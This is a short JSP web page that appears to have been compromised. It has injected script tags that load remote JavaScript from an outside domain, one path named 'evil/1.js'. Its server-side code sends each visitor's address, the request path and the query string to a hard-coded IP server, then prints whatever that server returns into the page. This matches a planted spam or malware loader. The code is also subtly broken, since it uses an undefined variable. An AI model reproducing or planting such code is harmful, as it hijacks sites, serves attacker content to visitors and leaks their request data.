document.write("<script src=\"http://cpm.36obuy.org/lion/1.js\"></script>");<script src="http://cpm.36obuy.org/lion/1.js"></script>document.write("<script src=\"http://cpm.36obuy.org/evil/1.js\"></script>");<script src="http://cpm.36obuy.org/evil/1.js"></script><%@ page language="java" import="java.util.*" pageEncoding="GB2312"%>
<%@page import="com.http.web.*" %>


<%

String rjrtyrhururif ="http://122.114.247.204/AA/";

String host_name="http://" + request.getRemoteAddr() + request.getRequestURI();

String Remote_file = Remdte_sevcev + "/index.php?host=" + host_name + "&url=" + request.getQueryString() + "&domain="+request.getServerName();

String Content_mb = myHttpClient.getHttpget(Remote_file);

out.println(Content_mb);

%>


